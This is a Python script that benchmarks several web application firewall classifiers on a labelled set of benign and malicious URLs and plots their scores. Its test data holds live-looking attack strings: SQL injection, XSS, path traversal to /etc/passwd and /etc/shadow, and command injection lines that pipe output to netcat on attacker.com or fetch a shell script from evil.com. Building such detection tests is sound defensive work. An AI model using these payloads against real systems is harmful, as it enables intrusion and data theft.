#!/usr/bin/env python3
"""
Comprehensive model comparison script for WAF models.
Tests multiple models against benign and malicious URLs,
generates performance metrics and comparison visualizations.
"""
import os
import sys
import joblib
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
from pathlib import Path
from sklearn.metrics import (
    accuracy_score, precision_score, recall_score, f1_score,
    confusion_matrix, roc_curve, auc, classification_report
)
from time import time
import warnings
warnings.filterwarnings('ignore')

# Set style for better-looking plots
sns.set_style("whitegrid")
plt.rcParams['figure.figsize'] = (12, 8)

MODEL_DIR = Path(__file__).resolve().parent

MODELS = {
    "Random Forest": MODEL_DIR / "predictor_rf.joblib",
    "Logistic Regression": MODEL_DIR / "predictor_lr.joblib",
    "SVM": MODEL_DIR / "predictor_svc.joblib",
    "Naive Bayes": MODEL_DIR / "waf_improved_model.pkl",
}

# Test dataset with benign and malicious URLs
TEST_URLS = {
    # Benign URLs
    "benign": [
        "https://www.google.com/search?q=python+programming",
        "https://github.com/user/repo/issues/123",
        "https://example.com/api/users?id=456&format=json",
        "https://shop.com/products/electronics?category=laptops&sort=price",
        "https://news.site.com/article/2024/tech-innovation",
        "https://docs.python.org/3/library/os.html",
        "https://stackoverflow.com/questions/12345/how-to-code",
        "https://www.wikipedia.org/wiki/Machine_Learning",
        "https://medium.com/@author/article-title-here",
        "https://api.weather.com/v1/forecast?location=nyc&days=5",
        "http://localhost:8080/admin/dashboard",
        "https://myapp.com/user/profile?id=100",
        "https://blog.example.com/2024/01/new-post",
        "https://cdn.website.com/images/photo.jpg?w=800&h=600",
        "https://forum.site.com/thread/12345?page=2",
    ],
    
    # SQL Injection attacks
    "sqli": [
        "https://site.com/user?id=1' OR '1'='1",
        "https://site.com/search?q=admin'--",
        "https://site.com/login?user=admin' UNION SELECT * FROM users--",
        "https://site.com/page?id=1; DROP TABLE users--",
        "https://site.com/api?name=x' AND 1=1--",
        "https://site.com/search?q=' OR 1=1#",
        "https://site.com/product?id=1' UNION ALL SELECT NULL,NULL,NULL--",
        "https://site.com/user?id=1' AND SLEEP(5)--",
    ],
    
    # XSS attacks
    "xss": [
        "https://site.com/search?q=<script>alert('XSS')</script>",
        "https://site.com/comment?text=<img src=x onerror=alert(1)>",
        "https://site.com/user?name=<svg/onload=alert('XSS')>",
        "https://site.com/page?input=<iframe src=javascript:alert(1)>",
        "https://site.com/search?q=<body onload=alert('xss')>",
        "https://site.com/msg?text=<script>document.cookie</script>",
        "https://site.com/input?data=<img src=\"x\" onerror=\"alert(1)\">",
    ],
    
    # Path Traversal attacks
    "path_traversal": [
        "https://site.com/file?path=../../etc/passwd",
        "https://site.com/download?file=../../../windows/system32/config/sam",
        "https://site.com/read?doc=....//....//etc/shadow",
        "https://site.com/view?page=..%2F..%2F..%2Fetc%2Fpasswd",
        "https://site.com/file?name=../../../../../../etc/hosts",
    ],
    
    # Command Injection attacks
    "command_injection": [
        "https://site.com/ping?host=127.0.0.1; cat /etc/passwd",
        "https://site.com/exec?cmd=ls -la | nc attacker.com 4444",
        "https://site.com/system?command=whoami && id",
        "https://site.com/run?input=`cat /etc/shadow`",
        "https://site.com/shell?cmd=wget http://evil.com/shell.sh",
    ],
    
    # Other attacks
    "other": [
        "https://site.com/redirect?url=javascript:alert(1)",
        "https://site.com/load?file=php://input",
        "https://site.com/include?page=http://evil.com/malicious.php",
        "https://site.com/api?callback=eval(atob('malicious_code'))",
        "https://site.com/upload?file=shell.php%00.jpg",
    ]
}


def load_model(path):
    """Load a model from the given path."""
    if not path.exists():
        print(f"  ❌ Model file not found: {path}")
        print(f"     Expected location: {path.absolute()}")
        return None
    try:
        model = joblib.load(path)
        print(f"  ✓ Successfully loaded: {path.name}")
        return model
    except Exception as e:
        print(f"  ❌ Failed to load model {path.name}")
        print(f"     Error: {e}")
        return None


def predict_with_model(model, text):
    """Get prediction from a model, handling different model types."""
    try:
        pred = model.predict([text])[0]
        try:
            proba = model.predict_proba([text])[0]
        except:
            try:
                proba = model.best_estimator_.predict_proba([text])[0]
            except:
                proba = None
        return pred, proba
    except:
        try:
            pred = model.best_estimator_.predict([text])[0]
            proba = model.best_estimator_.predict_proba([text])[0]
            return pred, proba
        except Exception as e:
            return None, None


def create_labeled_dataset():
    """Create a labeled dataset from test URLs."""
    X = []
    y = []
    
    # Add benign URLs (label: 0 or 'benign')
    for url in TEST_URLS['benign']:
        X.append(url)
        y.append(0)
    
    # Add malicious URLs (label: 1 or 'malicious')
    for category in ['sqli', 'xss', 'path_traversal', 'command_injection', 'other']:
        for url in TEST_URLS[category]:
            X.append(url)
            y.append(1)
    
    return X, y


def evaluate_model(model, X, y, model_name):
    """Evaluate a single model and return metrics."""
    predictions = []
    probas = []
    inference_times = []
    
    print(f"\nEvaluating {model_name}...")
    
    for text in X:
        start = time()
        pred, proba = predict_with_model(model, text)
        elapsed = time() - start
        
        if pred is None:
            print(f"  ⚠ Prediction failed for: {text[:50]}...")
            return None
        
        predictions.append(pred)
        probas.append(proba)
        inference_times.append(elapsed)
    
    # Convert predictions to binary (handle different label types)
    y_pred = []
    for pred in predictions:
        if isinstance(pred, str):
            y_pred.append(1 if pred.lower() in ['malicious', 'attack', '1'] else 0)
        else:
            y_pred.append(int(pred))
    
    # Calculate metrics
    metrics = {
        'name': model_name,
        'accuracy': accuracy_score(y, y_pred),
        'precision': precision_score(y, y_pred, zero_division=0),
        'recall': recall_score(y, y_pred, zero_division=0),
        'f1': f1_score(y, y_pred, zero_division=0),
        'confusion_matrix': confusion_matrix(y, y_pred),
        'avg_inference_time': np.mean(inference_times),
        'predictions': y_pred,
        'probabilities': probas
    }
    
    print(f"  ✓ Accuracy: {metrics['accuracy']:.3f}")
    print(f"  ✓ Precision: {metrics['precision']:.3f}")
    print(f"  ✓ Recall: {metrics['recall']:.3f}")
    print(f"  ✓ F1 Score: {metrics['f1']:.3f}")
    print(f"  ✓ Avg Inference Time: {metrics['avg_inference_time']*1000:.2f}ms")
    
    return metrics


def plot_metrics_comparison(results):
    """Create comparison plots for all models."""
    model_names = [r['name'] for r in results]
    
    # 1. Bar plot of main metrics
    fig, axes = plt.subplots(2, 2, figsize=(15, 10))
    fig.suptitle('Model Performance Comparison', fontsize=16, fontweight='bold')
    
    metrics_to_plot = ['accuracy', 'precision', 'recall', 'f1']
    metric_labels = ['Accuracy', 'Precision', 'Recall', 'F1 Score']
    
    for idx, (metric, label) in enumerate(zip(metrics_to_plot, metric_labels)):
        ax = axes[idx // 2, idx % 2]
        values = [r[metric] for r in results]
        bars = ax.bar(model_names, values, color=plt.cm.viridis(np.linspace(0.3, 0.9, len(model_names))))
        ax.set_ylabel(label, fontsize=12)
        ax.set_ylim([0, 1.0])
        ax.set_title(f'{label} Comparison', fontsize=13, fontweight='bold')
        ax.grid(axis='y', alpha=0.3)
        
        # Add value labels on bars
        for bar in bars:
            height = bar.get_height()
            ax.text(bar.get_x() + bar.get_width()/2., height,
                   f'{height:.3f}', ha='center', va='bottom', fontsize=10)
        
        plt.setp(ax.xaxis.get_majorticklabels(), rotation=45, ha='right')
    
    plt.tight_layout()
    plt.savefig('model_metrics_comparison.png', dpi=300, bbox_inches='tight')
    print("\n✓ Saved: model_metrics_comparison.png")
    
    # 2. Confusion matrices
    n_models = len(results)
    fig, axes = plt.subplots(1, n_models, figsize=(5*n_models, 4))
    if n_models == 1:
        axes = [axes]
    fig.suptitle('Confusion Matrices', fontsize=16, fontweight='bold')
    
    for idx, result in enumerate(results):
        cm = result['confusion_matrix']
        sns.heatmap(cm, annot=True, fmt='d', cmap='Blues', ax=axes[idx],
                   xticklabels=['Benign', 'Malicious'],
                   yticklabels=['Benign', 'Malicious'])
        axes[idx].set_title(result['name'], fontsize=12, fontweight='bold')
        axes[idx].set_ylabel('True Label')
        axes[idx].set_xlabel('Predicted Label')
    
    plt.tight_layout()
    plt.savefig('confusion_matrices.png', dpi=300, bbox_inches='tight')
    print("✓ Saved: confusion_matrices.png")
    
    # 3. Inference time comparison
    fig, ax = plt.subplots(figsize=(10, 6))
    times = [r['avg_inference_time'] * 1000 for r in results]  # Convert to ms
    bars = ax.bar(model_names, times, color=plt.cm.plasma(np.linspace(0.3, 0.9, len(model_names))))
    ax.set_ylabel('Average Inference Time (ms)', fontsize=12)
    ax.set_title('Model Inference Speed Comparison', fontsize=14, fontweight='bold')
    ax.grid(axis='y', alpha=0.3)
    
    for bar in bars:
        height = bar.get_height()
        ax.text(bar.get_x() + bar.get_width()/2., height,
               f'{height:.2f}ms', ha='center', va='bottom', fontsize=10)
    
    plt.setp(ax.xaxis.get_majorticklabels(), rotation=45, ha='right')
    plt.tight_layout()
    plt.savefig('inference_time_comparison.png', dpi=300, bbox_inches='tight')
    print("✓ Saved: inference_time_comparison.png")
    
    # 4. Overall metrics radar chart
    fig, ax = plt.subplots(figsize=(10, 10), subplot_kw=dict(projection='polar'))
    
    categories = ['Accuracy', 'Precision', 'Recall', 'F1 Score']
    N = len(categories)
    angles = np.linspace(0, 2 * np.pi, N, endpoint=False).tolist()
    angles += angles[:1]
    
    ax.set_theta_offset(np.pi / 2)
    ax.set_theta_direction(-1)
    ax.set_xticks(angles[:-1])
    ax.set_xticklabels(categories, size=12)
    ax.set_ylim(0, 1)
    ax.set_yticks([0.2, 0.4, 0.6, 0.8, 1.0])
    ax.set_yticklabels(['0.2', '0.4', '0.6', '0.8', '1.0'], size=10)
    ax.grid(True)
    
    colors = plt.cm.Set2(np.linspace(0, 1, len(results)))
    
    for idx, result in enumerate(results):
        values = [result['accuracy'], result['precision'], result['recall'], result['f1']]
        values += values[:1]
        ax.plot(angles, values, 'o-', linewidth=2, label=result['name'], color=colors[idx])
        ax.fill(angles, values, alpha=0.15, color=colors[idx])
    
    ax.set_title('Overall Performance Radar Chart', size=16, fontweight='bold', pad=20)
    ax.legend(loc='upper right', bbox_to_anchor=(1.3, 1.0))
    
    plt.tight_layout()
    plt.savefig('performance_radar.png', dpi=300, bbox_inches='tight')
    print("✓ Saved: performance_radar.png")


def print_detailed_report(results, X, y):
    """Print detailed comparison report."""
    print("\n" + "="*80)
    print("DETAILED MODEL COMPARISON REPORT")
    print("="*80)
    
    print(f"\nDataset Summary:")
    print(f"  Total samples: {len(y)}")
    print(f"  Benign URLs: {sum(1 for label in y if label == 0)}")
    print(f"  Malicious URLs: {sum(1 for label in y if label == 1)}")
    
    print("\n" + "-"*80)
    print(f"{'Model':<25} {'Accuracy':<12} {'Precision':<12} {'Recall':<12} {'F1 Score':<12}")
    print("-"*80)
    
    for result in results:
        print(f"{result['name']:<25} "
              f"{result['accuracy']:<12.4f} "
              f"{result['precision']:<12.4f} "
              f"{result['recall']:<12.4f} "
              f"{result['f1']:<12.4f}")
    
    print("-"*80)
    
    # Find best model for each metric
    best_accuracy = max(results, key=lambda x: x['accuracy'])
    best_precision = max(results, key=lambda x: x['precision'])
    best_recall = max(results, key=lambda x: x['recall'])
    best_f1 = max(results, key=lambda x: x['f1'])
    best_speed = min(results, key=lambda x: x['avg_inference_time'])
    
    print("\nBest Models:")
    print(f"  🏆 Highest Accuracy: {best_accuracy['name']} ({best_accuracy['accuracy']:.4f})")
    print(f"  🏆 Highest Precision: {best_precision['name']} ({best_precision['precision']:.4f})")
    print(f"  🏆 Highest Recall: {best_recall['name']} ({best_recall['recall']:.4f})")
    print(f"  🏆 Highest F1 Score: {best_f1['name']} ({best_f1['f1']:.4f})")
    print(f"  ⚡ Fastest Inference: {best_speed['name']} ({best_speed['avg_inference_time']*1000:.2f}ms)")
    
    print("\n" + "="*80)


def main():
    print("="*80)
    print("WAF MODEL COMPARISON AND TESTING")
    print("="*80)
    
    # Load all models
    models = {}
    print(f"\nSearching for models in: {MODEL_DIR.absolute()}")
    print("\nAttempting to load models...")
    print("-" * 60)
    
    for name, path in MODELS.items():
        print(f"\n{name}:")
        model = load_model(path)
        if model is not None:
            models[name] = model
    
    print("\n" + "=" * 60)
    print(f"Summary: {len(models)}/{len(MODELS)} models loaded successfully")
    print("=" * 60)
    
    if not models:
        print("\n❌ No models could be loaded.")
        print("\nPlease check:")
        print("  1. Are the model files in the correct directory?")
        print("  2. Run 'ls -la' in the script directory to see available files")
        print("  3. Make sure the model filenames match exactly")
        sys.exit(1)
    
    if len(models) < len(MODELS):
        print(f"\n⚠ Warning: Only {len(models)} out of {len(MODELS)} models were loaded.")
        print("The comparison will proceed with available models.\n")
    
    # Create test dataset
    print("\nPreparing test dataset...")
    X, y = create_labeled_dataset()
    print(f"  ✓ Created dataset with {len(X)} URLs")
    print(f"    - Benign: {sum(1 for label in y if label == 0)}")
    print(f"    - Malicious: {sum(1 for label in y if label == 1)}")
    
    # Evaluate each model
    results = []
    for name, model in models.items():
        result = evaluate_model(model, X, y, name)
        if result is not None:
            results.append(result)
    
    if not results:
        print("\n❌ No models could be evaluated. Exiting.")
        sys.exit(1)
    
    # Generate visualizations
    print("\n" + "="*80)
    print("Generating comparison visualizations...")
    print("="*80)
    plot_metrics_comparison(results)
    
    # Print detailed report
    print_detailed_report(results, X, y)
    
    print("\n✓ Analysis complete! Check the generated PNG files for visualizations.")


if __name__ == "__main__":
    main()